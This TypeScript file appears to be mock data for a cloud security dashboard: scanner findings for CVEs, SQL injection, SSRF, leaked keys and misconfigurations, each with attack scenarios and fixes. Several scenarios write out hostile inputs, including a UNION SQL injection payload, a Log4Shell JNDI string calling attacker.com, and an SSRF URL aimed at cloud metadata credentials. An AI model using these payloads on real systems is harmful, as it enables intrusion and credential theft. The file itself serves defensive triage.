import type { SecurityFinding } from '@cloudguard/types';

const now = () => new Date().toISOString();

export const findingsDatabase: SecurityFinding[] = [
  // ─── TRIVY: Container CVEs ──────────────────────────────────────────────────
  {
    id: 'f-trivy-001',
    scanner: 'trivy',
    category: 'container',
    title: 'CVE-2024-3094: XZ Utils Backdoor (Supply Chain RCE)',
    description: 'A malicious backdoor was inserted into xz-utils 5.6.0-5.6.1 that allows remote code execution via OpenSSH on systemd-based systems. CVSS 10.0.',
    severity: 'critical',
    cvss: 10.0,
    epss: 0.9412,
    cve: 'CVE-2024-3094',
    cwe: 'CWE-506',
    mitre: 'T1195.001',
    resource: 'registry.cloudguard.io/payment-api:2.1.4',
    resourceType: 'ContainerImage',
    provider: 'docker',
    location: 'xz-utils@5.6.0 (debian:bookworm-slim layer)',
    evidence: 'xz-utils==5.6.0 detected in /var/lib/dpkg/info/xz-utils.list',
    recommendation: 'Upgrade xz-utils to 5.4.6 or later. Rebuild image immediately.',
    fixVersion: '5.4.6',
    aiEnrichment: {
      rootCause: 'A supply chain attack was executed by a malicious contributor (Jia Tan) who inserted a backdoor into the xz-utils compression library over two years, specifically targeting OpenSSH authentication on systemd-based Linux distributions.',
      businessImpact: 'Any server running the affected xz-utils version with SSH exposed could be compromised without authentication, giving attackers full root access. This affects payment-api containers which run in production with access to financial transaction data.',
      attackScenario: 'Attacker sends specially crafted SSH packets → backdoored xz-utils intercepts authentication → RSA key decryption hook executes arbitrary commands as root → full container compromise → lateral movement to RDS and IAM.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools',
      terraformPatch: `# Update ECR image tag in Terraform
resource "aws_ecs_task_definition" "payment_api" {
  container_definitions = jsonencode([{
    image = "registry.cloudguard.io/payment-api:2.1.4-patched"
    # Rebuilt from debian:bookworm-slim with xz-utils 5.4.6
  }])
}`,
      developerGuidance: 'Run `docker pull registry.cloudguard.io/payment-api:2.1.4-patched` and redeploy. Run `dpkg -l xz-utils` in all running containers to audit exposure. Block the affected version in your OCI admission controller.',
      effort: 'low',
      confidence: 99,
      executiveSummary: 'Critical supply chain attack embedded in a core Linux compression library. All production containers using xz-utils 5.6.x must be immediately rebuilt. CISA KEV listed.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-grype-001'],
    tags: ['supply-chain', 'cisa-kev', 'rce', 'ssh'],
  },
  {
    id: 'f-trivy-002',
    scanner: 'trivy',
    category: 'container',
    title: 'CVE-2024-21626: runc Container Escape Vulnerability',
    description: 'runc 1.1.11 allows container escape via crafted process.cwd or mount via leaked file descriptor. Affects all container runtimes using runc.',
    severity: 'critical',
    cvss: 8.6,
    epss: 0.8734,
    cve: 'CVE-2024-21626',
    cwe: 'CWE-403',
    mitre: 'T1611',
    resource: 'eks-prod-main / payment-processor-7d8f9b',
    resourceType: 'ContainerCluster',
    provider: 'kubernetes',
    location: 'runc@1.1.11 (container runtime)',
    evidence: 'runc --version output: runc version 1.1.11, commit: v1.1.11-0-g4bccb38',
    recommendation: 'Upgrade runc to 1.1.12+. Update container runtime on all EKS nodes immediately.',
    fixVersion: '1.1.12',
    aiEnrichment: {
      rootCause: 'runc mishandles internal file descriptors during container initialization, allowing a process inside the container to access the host filesystem by exploiting process.cwd.',
      businessImpact: 'Successful exploitation allows complete escape from container isolation, giving an attacker access to the EKS node and all other containers running on that node — including those in other namespaces.',
      attackScenario: 'Attacker gains code execution inside container → exploits runc fd leak → accesses /proc/self/fd on host → reads host filesystem → pivots to steal node IAM role credentials → accesses AWS APIs with node permissions.',
      mitreTactic: 'Privilege Escalation',
      mitreTechnique: 'T1611 — Escape to Host',
      yamlPatch: `# Apply node group update to upgrade containerd/runc
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-updater
spec:
  template:
    spec:
      containers:
      - name: update-runc
        image: amazonlinux:2023
        command: ["yum", "update", "-y", "runc", "containerd"]
        securityContext:
          privileged: true`,
      developerGuidance: 'Update EKS managed node groups to AMI version ≥ al2023-eks-node-1.29-v20240131. Apply PodSecurityPolicy or Kyverno policy to block privileged containers.',
      effort: 'medium',
      confidence: 96,
      executiveSummary: 'Critical container escape vulnerability in runc. All EKS production nodes running runc 1.1.11 are vulnerable to host breakout. Node groups must be rotated.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-falco-001'],
    tags: ['container-escape', 'kubernetes', 'cisa-kev'],
  },

  // ─── SEMGREP: SAST ─────────────────────────────────────────────────────────
  {
    id: 'f-semgrep-001',
    scanner: 'semgrep',
    category: 'sast',
    title: 'SQL Injection via Unsanitized User Input',
    description: 'User-controlled input directly concatenated into SQL query without parameterization. High-confidence SQL injection via /api/v1/users/search endpoint.',
    severity: 'critical',
    cvss: 9.8,
    cwe: 'CWE-89',
    mitre: 'T1190',
    resource: 'org/cloudguard-enterprise/apps/api',
    resourceType: 'Repository',
    provider: 'github',
    location: 'apps/api/routes/users.py:L47',
    evidence: 'query = f"SELECT * FROM users WHERE name LIKE \'%{request.args[\'q\']}%\'"',
    recommendation: 'Use parameterized queries or ORM. Replace with: cursor.execute("SELECT * FROM users WHERE name LIKE %s", (f"%{q}%",))',
    aiEnrichment: {
      rootCause: 'Developer used f-string interpolation to build SQL queries instead of parameterized queries. This pattern is extremely common in Python Flask codebases and often introduced during rapid feature development.',
      businessImpact: 'Attacker can read the entire users database including PII, extract credentials, modify records, or in some DB configurations execute OS commands (INTO OUTFILE, xp_cmdshell).',
      attackScenario: 'Attacker sends: GET /api/v1/users/search?q=\' UNION SELECT username,password,NULL FROM admin_users-- → Extracts admin credentials → Uses credentials to access admin panel → Full database compromise.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1190 — Exploit Public-Facing Application',
      developerGuidance: 'Replace all f-string SQL with: cursor.execute(query, params). Use SQLAlchemy ORM where possible. Add Bandit to CI/CD pipeline.',
      effort: 'trivial',
      confidence: 98,
      executiveSummary: 'Critical SQL injection vulnerability exposes the entire user database to unauthenticated attackers via a public API endpoint.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-codeql-001'],
    tags: ['owasp-a03', 'sql-injection', 'api'],
  },

  // ─── CHECKOV: IaC ──────────────────────────────────────────────────────────
  {
    id: 'f-checkov-001',
    scanner: 'checkov',
    category: 'iac',
    title: 'CKV_AWS_24: Security Group Allows Unrestricted SSH Access (0.0.0.0/0:22)',
    description: 'AWS Security Group permits inbound SSH connections from any IP address. This exposes the associated EC2 instances to brute force and credential-based attacks from the internet.',
    severity: 'critical',
    cvss: 9.1,
    cwe: 'CWE-284',
    mitre: 'T1021.004',
    resource: 'aws_security_group.payment_service_sg',
    resourceType: 'FirewallRule',
    provider: 'aws',
    location: 'terraform/modules/ec2/main.tf:L34',
    evidence: 'ingress { from_port = 22; to_port = 22; protocol = "tcp"; cidr_blocks = ["0.0.0.0/0"] }',
    recommendation: 'Restrict SSH access to specific CIDR blocks, VPN IPs, or use AWS Systems Manager Session Manager instead.',
    aiEnrichment: {
      rootCause: 'Developer opened SSH broadly for debugging access and the change was never restricted before reaching production. Common in organizations without IaC scanning in their CI/CD pipeline.',
      businessImpact: 'Internet-exposed SSH allows attackers to attempt credential brute force, exploit SSH CVEs, or use leaked credentials to gain direct server access. Payment service servers have database credentials in environment variables.',
      attackScenario: 'Attacker scans 0.0.0.0/0 for port 22 → targets payment-service EC2 → brute forces SSH or uses credential from darknet leak → logs in as ec2-user → retrieves DB credentials from environment → exfiltrates payment records.',
      mitreTactic: 'Lateral Movement',
      mitreTechnique: 'T1021.004 — Remote Services: SSH',
      terraformPatch: `resource "aws_security_group" "payment_service_sg" {
  name = "payment-service-sg"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    # Restrict to VPN CIDR only
    cidr_blocks = ["10.0.0.0/8"]
    description = "SSH from VPN only"
  }
}`,
      developerGuidance: 'Replace SSH access with AWS Systems Manager Session Manager. Remove the ingress rule entirely and use SSM for all EC2 access. No inbound ports required.',
      effort: 'low',
      confidence: 100,
      executiveSummary: 'Production payment servers have SSH open to the entire internet. This is a P0 misconfiguration that must be closed immediately.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['network', 'ssh', 'internet-exposed', 'terraform'],
  },

  // ─── TRUFFLEHOG: Secrets ───────────────────────────────────────────────────
  {
    id: 'f-trufflehog-001',
    scanner: 'trufflehog',
    category: 'secrets',
    title: 'Verified AWS Access Key Leaked in Git History',
    description: 'A live AWS Access Key was found embedded in git commit history. TruffleHog verified the key is still active against the AWS STS API. Key has IAM permissions in production account.',
    severity: 'critical',
    cvss: 9.9,
    epss: 0.9812,
    cwe: 'CWE-798',
    mitre: 'T1552.001',
    resource: 'org/cloudguard-enterprise/repo/infra',
    resourceType: 'Repository',
    provider: 'github',
    location: 'commit a3f82b1c (2024-03-15) — terraform/variables.tf:L8',
    evidence: 'AWS_ACCESS_KEY_ID: AKIA[REDACTED]XAMPLE — KEY IS LIVE AND VERIFIED',
    recommendation: 'Immediately revoke key in IAM console. Rotate all credentials in affected account. Audit CloudTrail for unauthorized usage.',
    aiEnrichment: {
      rootCause: 'Developer hardcoded AWS credentials directly in Terraform variables file during initial setup and committed to git. Even after removal, git history retained the credential. Organizations without git-secret scanning are blind to this pattern.',
      businessImpact: 'Attacker with this key can authenticate to AWS as the associated IAM user/role. If the role has broad permissions (common for infrastructure roles), they can read S3 data, launch EC2 instances, modify RDS databases, or destroy infrastructure.',
      attackScenario: 'Attacker finds key via GitHub search → aws sts get-caller-identity (verified) → aws iam list-attached-role-policies → discovers AdministratorAccess → aws s3 sync s3://payment-data-vault → full data exfiltration.',
      mitreTactic: 'Credential Access',
      mitreTechnique: 'T1552.001 — Unsecured Credentials: Credentials In Files',
      developerGuidance: 'IMMEDIATE: Deactivate key in AWS IAM Console. Audit CloudTrail logs for the past 90 days. Use git-filter-repo to purge from history. Implement git-secrets or gitleaks in pre-commit hooks.',
      effort: 'medium',
      confidence: 100,
      executiveSummary: 'A live, verified AWS credential was found in public git history. Immediate revocation and CloudTrail audit required. This may constitute a reportable security incident.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-gitleaks-001'],
    tags: ['secrets', 'aws-credentials', 'verified', 'git-history'],
  },

  // ─── KUBE-BENCH: Kubernetes ─────────────────────────────────────────────────
  {
    id: 'f-kubebench-001',
    scanner: 'kube-bench',
    category: 'kubernetes',
    title: 'CIS 1.2.1: API Server Anonymous Authentication Enabled',
    description: 'The Kubernetes API server has --anonymous-auth set to true (or not explicitly false), allowing unauthenticated requests to reach the API server with the system:anonymous user.',
    severity: 'high',
    cvss: 8.1,
    cwe: 'CWE-306',
    mitre: 'T1078.004',
    resource: 'eks-prod-main / kube-apiserver',
    resourceType: 'ContainerCluster',
    provider: 'kubernetes',
    location: 'kube-apiserver.yaml — --anonymous-auth flag',
    evidence: '--anonymous-auth=true (default, not explicitly disabled)',
    recommendation: 'Add --anonymous-auth=false to kube-apiserver arguments. Verify health check endpoints use dedicated service accounts instead.',
    aiEnrichment: {
      rootCause: 'EKS managed clusters enable anonymous auth by default for health check compatibility. Many organizations do not override this default as part of their hardening process.',
      businessImpact: 'Anonymous requests can reach public API endpoints including /healthz, /readyz, and in misconfigured clusters, resource listings. Combined with other vulnerabilities, this can be escalated to unauthorized access.',
      attackScenario: 'Attacker probes API server anonymously → discovers exposed endpoints → uses verbose error messages to enumerate internal cluster details → combines with RBAC misconfiguration for privilege escalation.',
      mitreTactic: 'Defense Evasion',
      mitreTechnique: 'T1078.004 — Valid Accounts: Cloud Accounts',
      developerGuidance: 'In EKS, update the API server config via aws eks update-cluster-config. For self-managed: add --anonymous-auth=false to API server manifest.',
      effort: 'low',
      confidence: 95,
      executiveSummary: 'Production Kubernetes API server allows anonymous access, violating CIS Benchmark. This weakens authentication controls and aids reconnaissance.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['kubernetes', 'cis-benchmark', 'authentication'],
  },

  // ─── FALCO: Runtime ─────────────────────────────────────────────────────────
  {
    id: 'f-falco-001',
    scanner: 'falco',
    category: 'runtime',
    title: 'Shell Spawned Inside Production Container',
    description: 'A bash/sh process was spawned inside the payment-processor container in production namespace. Interactive shell execution in containers is a strong indicator of compromise or unauthorized access.',
    severity: 'critical',
    cvss: 9.0,
    mitre: 'T1059.004',
    resource: 'eks-prod-main / payment-processor-7d8f9b',
    resourceType: 'ContainerCluster',
    provider: 'kubernetes',
    location: 'Pod: payment-processor-7d8f9b / Container: payment-processor / Namespace: production',
    evidence: 'Process tree: containerd-shim → payment-processor (node:18) → /bin/bash (uid=0) — 2024-07-14T06:23:11Z',
    recommendation: 'Immediately investigate the shell session. Isolate the pod. Review kubectl exec audit logs. Consider this pod compromised.',
    aiEnrichment: {
      rootCause: 'A shell was spawned inside a running production container, either via kubectl exec, a container escape exploit, or via a command injection vulnerability in the application. Root access (uid=0) indicates the container runs as root.',
      businessImpact: 'An attacker with shell access inside the payment-processor container can read environment variables (DB credentials, API keys), modify application code, exfiltrate transaction data, or use the container as a pivot point into the cluster network.',
      attackScenario: 'Shell access → read /proc/env for database URLs and API keys → curl internal services bypassing network policies → read payment records → establish reverse shell to C2 → lateral movement.',
      mitreTactic: 'Execution',
      mitreTechnique: 'T1059.004 — Command and Scripting Interpreter: Unix Shell',
      yamlPatch: `# Prevent shell spawning with securityContext
spec:
  containers:
  - name: payment-processor
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]`,
      developerGuidance: 'IMMEDIATE: kubectl describe pod payment-processor-7d8f9b and check events. kubectl logs --previous for crash indicators. Cordon the node. Review kubectl exec audit logs in CloudTrail.',
      effort: 'high',
      confidence: 97,
      executiveSummary: 'Active security incident: Shell process detected inside production payment container running as root. Treat as active compromise until investigation proves otherwise.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-trivy-002'],
    tags: ['runtime', 'active-threat', 'shell', 'root'],
  },

  // ─── OWASP ZAP: API ─────────────────────────────────────────────────────────
  {
    id: 'f-zap-001',
    scanner: 'owasp-zap',
    category: 'api',
    title: 'SQL Injection in /api/v1/users/search Endpoint',
    description: 'OWASP ZAP active scan confirmed SQL injection via the q parameter. Payload `\' OR \'1\'=\'1` returns all records. Database: PostgreSQL 14.',
    severity: 'critical',
    cvss: 9.8,
    epss: 0.8921,
    cwe: 'CWE-89',
    mitre: 'T1190',
    resource: 'https://api.cloudguard-prod.io',
    resourceType: 'Repository',
    provider: 'aws',
    location: 'POST /api/v1/users/search?q=',
    evidence: "Payload: ' OR '1'='1 — Response: 200 OK with 47,823 user records",
    recommendation: 'Use parameterized queries. Apply WAF rule to block SQL injection patterns. Rate-limit the search endpoint.',
    aiEnrichment: {
      rootCause: 'Active scan confirmed the SQL injection vulnerability found by Semgrep static analysis. The endpoint is actively exploitable in production.',
      businessImpact: 'All 47,823 user records including PII are exposed. Attacker can extract passwords, emails, payment tokens and sell on darknet.',
      attackScenario: 'Automated SQLMap scan → dump full users table → extract hashed passwords → hashcat offline crack → credential stuffing attack on other services.',
      mitreTactic: 'Collection',
      mitreTechnique: 'T1190 — Exploit Public-Facing Application',
      developerGuidance: 'This is confirmed exploitable. IMMEDIATE: Take the endpoint offline or add WAF blocking rule. Fix code. See Semgrep finding f-semgrep-001 for patch.',
      effort: 'trivial',
      confidence: 100,
      executiveSummary: 'Confirmed active SQL injection in production API returning all user records. P0 incident — endpoint must be taken offline immediately.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-semgrep-001', 'f-codeql-001'],
    tags: ['api', 'sql-injection', 'confirmed-exploit', 'owasp-a03'],
  },

  // ─── DEPENDABOT ─────────────────────────────────────────────────────────────
  {
    id: 'f-dependabot-001',
    scanner: 'dependabot',
    category: 'dependency',
    title: 'CVE-2021-44228: Log4Shell RCE in log4j 2.14.1',
    description: 'Log4j versions 2.0-beta9 through 2.14.1 are vulnerable to remote code execution. Used in 3 internal Java microservices.',
    severity: 'critical',
    cvss: 10.0,
    epss: 0.9998,
    cve: 'CVE-2021-44228',
    cwe: 'CWE-917',
    mitre: 'T1203',
    resource: 'org/cloudguard-enterprise/services/analytics-engine',
    resourceType: 'Repository',
    provider: 'github',
    location: 'pom.xml — org.apache.logging.log4j:log4j-core:2.14.1',
    evidence: 'log4j-core:2.14.1 in Maven dependency tree (3 services affected)',
    recommendation: 'Upgrade log4j-core to 2.17.1+. Set -Dlog4j2.formatMsgNoLookups=true as immediate mitigation.',
    fixVersion: '2.17.1',
    aiEnrichment: {
      rootCause: 'Log4j 2.x has a JNDI lookup feature that processes user-controlled strings in log messages, allowing attackers to trigger arbitrary JNDI lookups including LDAP references that load and execute remote Java classes.',
      businessImpact: 'Any service that logs user-controlled input (HTTP headers, request params, usernames) is vulnerable to complete RCE. Analytics engine processes user-generated content and logs HTTP request metadata.',
      attackScenario: 'Attacker sends HTTP request with User-Agent: ${jndi:ldap://attacker.com/exploit} → analytics-engine logs the header → log4j performs LDAP lookup → loads remote Java class → executes attacker payload as the service user.',
      mitreTactic: 'Execution',
      mitreTechnique: 'T1203 — Exploitation for Client Execution',
      developerGuidance: 'IMMEDIATE: mvn versions:set -DnewVersion=2.17.1 for log4j-core. Apply JVM flag -Dlog4j2.formatMsgNoLookups=true as interim mitigation. Deploy WAF rule to block ${jndi: patterns.',
      effort: 'low',
      confidence: 100,
      executiveSummary: 'Log4Shell: The most critical Java vulnerability ever discovered is present in production services. RCE possible with a single HTTP request. Upgrade required immediately.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['log4shell', 'rce', 'java', 'cisa-kev', 'cvss-10'],
  },

  // ─── CODEQL: SAST ──────────────────────────────────────────────────────────
  {
    id: 'f-codeql-001',
    scanner: 'codeql',
    category: 'sast',
    title: 'Server-Side Request Forgery (SSRF) via User-Controlled URL',
    description: 'CodeQL taint analysis shows user-controlled URL parameter reaches HTTP request without validation, enabling SSRF attacks against internal services and cloud metadata APIs.',
    severity: 'high',
    cvss: 8.6,
    cwe: 'CWE-918',
    mitre: 'T1552.005',
    resource: 'org/cloudguard-enterprise/services/proxy',
    resourceType: 'Repository',
    provider: 'github',
    location: 'services/proxy.py:L89',
    evidence: 'url = request.args["target"]; response = requests.get(url, timeout=5)',
    recommendation: 'Validate URL against allowlist of trusted domains. Block requests to 169.254.169.254 (IMDS), 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.',
    aiEnrichment: {
      rootCause: 'The proxy service accepts a target URL parameter and forwards requests without validation. This was built as a "simple" utility for the frontend team but became a powerful SSRF primitive.',
      businessImpact: 'Attacker can use the proxy to reach the AWS EC2 Instance Metadata Service (169.254.169.254) to steal IAM credentials, scan internal services not exposed to the internet, or exfiltrate data to external servers.',
      attackScenario: 'GET /proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → retrieve IAM role credentials → use credentials to access AWS APIs → full account compromise via stolen role.',
      mitreTactic: 'Credential Access',
      mitreTechnique: 'T1552.005 — Unsecured Credentials: Cloud Instance Metadata API',
      developerGuidance: 'Add URL allowlist validation. Block private IP ranges with a regex check before making the request. Consider using IMDSv2 with hop limit=1 to prevent SSRF reaching metadata.',
      effort: 'low',
      confidence: 94,
      executiveSummary: 'SSRF vulnerability enables attackers to steal AWS credentials via Instance Metadata Service. This can lead to full cloud account compromise.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['ssrf', 'imds', 'aws-credentials', 'owasp-a10'],
  },

  // ─── GITLEAKS ───────────────────────────────────────────────────────────────
  {
    id: 'f-gitleaks-001',
    scanner: 'gitleaks',
    category: 'secrets',
    title: 'Stripe API Key Hardcoded in Test Fixtures',
    description: 'A Stripe production API key was found hardcoded in test fixture JSON files. Key is prefixed sk_live_ indicating a production key.',
    severity: 'critical',
    cvss: 9.5,
    cwe: 'CWE-798',
    mitre: 'T1552.001',
    resource: 'org/cloudguard-enterprise/apps/payments',
    resourceType: 'Repository',
    provider: 'github',
    location: 'tests/fixtures/stripe.json:L3 (commit d8e4f92, 2024-03-22)',
    evidence: '{ "stripe_key": "sk_live_[REDACTED_48_CHARS]" } — matches sk_live_ pattern',
    recommendation: 'Immediately rotate the Stripe API key. Remove from repository history using git-filter-repo. Use environment variables for all credentials.',
    aiEnrichment: {
      rootCause: 'Developer used a production Stripe key in test fixtures for convenience, then committed and pushed to the shared repository. Test fixtures are often overlooked in secret scanning.',
      businessImpact: 'Stripe production API keys allow an attacker to initiate refunds, access customer payment data, list all charges, cancel subscriptions, or create fraudulent charges — all billable to the organization.',
      attackScenario: 'Attacker extracts key from git history → stripe charges list --api-key sk_live_... → access 2M+ customer payment records → initiate fraudulent refunds → drain business account.',
      mitreTactic: 'Collection',
      mitreTechnique: 'T1552.001 — Unsecured Credentials: Credentials In Files',
      developerGuidance: 'IMMEDIATE: Log in to Stripe Dashboard → Developers → API Keys → Roll key. Use Stripe restricted keys in tests. Set STRIPE_SECRET_KEY env var instead.',
      effort: 'trivial',
      confidence: 99,
      executiveSummary: 'Production Stripe payment API key exposed in source code. Immediate key rotation required. Potential PCI-DSS compliance violation.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: ['f-trufflehog-001'],
    tags: ['secrets', 'payment', 'stripe', 'pci-dss'],
  },

  // ─── CHECKOV: More IaC ──────────────────────────────────────────────────────
  {
    id: 'f-checkov-002',
    scanner: 'checkov',
    category: 'iac',
    title: 'CKV_AWS_78: RDS Instance Publicly Accessible',
    description: 'RDS database instance has publicly_accessible = true, exposing the database endpoint to the public internet.',
    severity: 'high',
    cvss: 8.5,
    cwe: 'CWE-668',
    mitre: 'T1190',
    resource: 'aws_db_instance.legacy_analytics',
    resourceType: 'Database',
    provider: 'aws',
    location: 'terraform/modules/rds/main.tf:L23',
    evidence: 'publicly_accessible = true — endpoint: legacy-analytics.c4xyz.us-east-1.rds.amazonaws.com:5432',
    recommendation: 'Set publicly_accessible = false. Use a bastion host or VPN for database access. Place RDS in private subnet.',
    aiEnrichment: {
      rootCause: 'RDS was initially configured for development convenience with public access and the setting was never changed for production deployment.',
      businessImpact: 'Direct internet access to the database allows automated credential brute-force, exploitation of DB engine CVEs, and data exfiltration without passing through application security controls.',
      attackScenario: 'Attacker scans port 5432 → connects to RDS endpoint → brute forces default users (postgres, admin) → or uses extracted credentials from leaked config → full database read/write access.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1190 — Exploit Public-Facing Application',
      terraformPatch: `resource "aws_db_instance" "legacy_analytics" {
  # ... existing config ...
  publicly_accessible = false
  db_subnet_group_name = aws_db_subnet_group.private.name
  vpc_security_group_ids = [aws_security_group.rds_private.id]
}`,
      developerGuidance: 'Apply the Terraform patch and run terraform apply. Database endpoint will become unreachable from internet. Use SSM port forwarding for direct access.',
      effort: 'low',
      confidence: 100,
      executiveSummary: 'Production RDS database directly accessible from the internet. This violates data protection requirements and enables unauthenticated database attacks.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['rds', 'database', 'internet-exposed', 'terraform'],
  },

  // ─── OPA: Compliance ────────────────────────────────────────────────────────
  {
    id: 'f-opa-001',
    scanner: 'opa',
    category: 'compliance',
    title: 'Policy Violation: 234 Containers Missing Resource Limits',
    description: 'OPA policy resource-limits-required failed for 234 containers across 89 deployments. Containers without resource limits can cause node OOM and cluster-wide instability.',
    severity: 'medium',
    cwe: 'CWE-400',
    mitre: 'T1499',
    resource: 'eks-prod-main / multiple namespaces',
    resourceType: 'ContainerCluster',
    provider: 'kubernetes',
    location: 'Multiple Kubernetes Deployments (89 affected)',
    evidence: 'containers without limits.memory or limits.cpu: 234 found across production, staging, monitoring namespaces',
    recommendation: 'Add resource limits to all container specs. Enforce via Kyverno admission policy to prevent future violations.',
    aiEnrichment: {
      rootCause: 'Kubernetes does not enforce resource limits by default. Development teams often omit limits for simplicity. Without a policy enforcement tool, these omissions compound over time.',
      businessImpact: 'A single poorly-written service can consume all node memory, causing OOM kills on neighboring pods including payment processors. This enables accidental or intentional DoS.',
      attackScenario: 'Attacker exploits SQL injection → gains code execution → runs memory-intensive process → triggers OOM killer → payment-processor pod killed → transaction processing outage.',
      mitreTactic: 'Impact',
      mitreTechnique: 'T1499 — Endpoint Denial of Service',
      yamlPatch: `resources:
  requests:
    memory: "256Mi"
    cpu: "250m"
  limits:
    memory: "512Mi"
    cpu: "500m"`,
      developerGuidance: 'Add resource limits to all container specs. Use kubectl set resources to batch-update existing deployments. Enable LimitRange in all namespaces.',
      effort: 'medium',
      confidence: 90,
      executiveSummary: 'Over 230 production containers lack resource limits, creating cluster stability risk and enabling denial of service attacks.',
    },
    status: 'open',
    discoveredAt: now(),
    correlatedWith: [],
    tags: ['kubernetes', 'compliance', 'resource-limits', 'opa'],
  },
];

// SBOM sample data
export const sbomData = [
  { id: 'sbom-001', name: 'log4j-core', version: '2.14.1', type: 'library' as const, license: 'Apache-2.0', supplier: 'Apache Software Foundation', cveCount: 5, criticalCves: ['CVE-2021-44228', 'CVE-2021-45046'], isDirect: true, depth: 0, purl: 'pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1' },
  { id: 'sbom-002', name: 'lodash', version: '4.17.20', type: 'library' as const, license: 'MIT', supplier: 'OpenJS Foundation', cveCount: 2, criticalCves: ['CVE-2021-23337'], isDirect: true, depth: 0, purl: 'pkg:npm/lodash@4.17.20' },
  { id: 'sbom-003', name: 'axios', version: '0.21.1', type: 'library' as const, license: 'MIT', supplier: 'Matt Zabriskie', cveCount: 1, criticalCves: [], isDirect: true, depth: 0, purl: 'pkg:npm/axios@0.21.1' },
  { id: 'sbom-004', name: 'xz-utils', version: '5.6.0', type: 'os' as const, license: 'GPL-2.0', supplier: 'Lasse Collin', cveCount: 1, criticalCves: ['CVE-2024-3094'], isDirect: false, depth: 2, purl: 'pkg:deb/debian/xz-utils@5.6.0' },
  { id: 'sbom-005', name: 'openssl', version: '3.0.13', type: 'library' as const, license: 'Apache-2.0', supplier: 'OpenSSL Foundation', cveCount: 3, criticalCves: [], isDirect: false, depth: 1, purl: 'pkg:deb/debian/openssl@3.0.13' },
  { id: 'sbom-006', name: 'requests', version: '2.28.2', type: 'library' as const, license: 'Apache-2.0', supplier: 'Kenneth Reitz', cveCount: 1, criticalCves: [], isDirect: true, depth: 0, purl: 'pkg:pypi/requests@2.28.2' },
  { id: 'sbom-007', name: 'urllib3', version: '1.26.18', type: 'library' as const, license: 'MIT', supplier: 'Andrey Petrov', cveCount: 2, criticalCves: [], isDirect: false, depth: 1, purl: 'pkg:pypi/urllib3@1.26.18' },
  { id: 'sbom-008', name: 'runc', version: '1.1.11', type: 'application' as const, license: 'Apache-2.0', supplier: 'Open Container Initiative', cveCount: 1, criticalCves: ['CVE-2024-21626'], isDirect: false, depth: 3, purl: 'pkg:github/opencontainers/runc@v1.1.11' },
  { id: 'sbom-009', name: 'express', version: '4.17.1', type: 'framework' as const, license: 'MIT', supplier: 'TJ Holowaychuk', cveCount: 0, criticalCves: [], isDirect: true, depth: 0, purl: 'pkg:npm/express@4.17.1' },
  { id: 'sbom-010', name: 'spring-core', version: '5.3.20', type: 'framework' as const, license: 'Apache-2.0', supplier: 'Pivotal', cveCount: 1, criticalCves: [], isDirect: true, depth: 0, purl: 'pkg:maven/org.springframework/spring-core@5.3.20' },
];
